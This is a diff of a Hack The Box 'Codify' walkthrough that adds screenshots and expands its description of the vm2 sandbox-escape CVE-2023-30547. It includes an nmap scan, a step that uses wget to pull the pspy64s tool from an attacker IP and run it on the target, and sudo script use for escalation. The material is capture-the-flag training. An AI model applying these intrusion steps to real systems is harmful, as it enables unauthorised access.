@@ -1,17 +1,19 @@
-*Add more details and put on resume*
 
 ```
-nmap -sC -sV {victim ip}
+nmap -sC -sV {10.129.138.108}
 ```
 
 I see ports 22, 80, and 3000 are open. When I visit port 80 I find the domain `codify.htb` and add the domain to the hosts file.
+![[Screenshot 2024-10-13 at 5.07.47 PM.png]]
 
 ```
 echo '10.10.11.239 codify.htb' | sudo tee -a /etc/hosts
 ```
 In the directory `/editor` there is a code editor which allows us to test NodeJS code
+![[Screenshot 2024-10-13 at 5.08.53 PM.png]]
 
-The code editor uses the open source library `vm2`, there is a vulnerability CVE-2023-30547, where attackers can raise a host exception that is not properly sanitized in handleException() function. By doing so, the attacker can escape the sandbox environment and execute arbitrary code on the host.
+
+The code editor uses the open source library `vm2`, which we can find on the `/about` page. There is a vulnerability CVE-2023-30547 in this library, this involves the improper sanitization of exceptions within the `vm2` sandbox, a feature intended to safely execute untrusted code. Attackers can exploit this flaw by raising a host exception that is not properly sanitized  in the `handleException()` function. By doing so, the attacker can escape the sandbox environment and execute arbitrary code on the host.
 
 If we run the following code in the editor:
 
@@ -112,8 +114,9 @@ $ wget http://10.10.14.99:8082/pspy64s
 $ chmod +x pspy64s
 $ ./pspy64s
 ```
-From another shell on our victim's box, we run the file we found from running `sudo -l`:
+![[Screenshot 2024-10-13 at 5.28.32 PM.png]]
 
+From another shell on our victim's box, we run the file we found from running `sudo -l`:
 ```
 sudo /opt/scripts/mysql-backup.sh
 ```
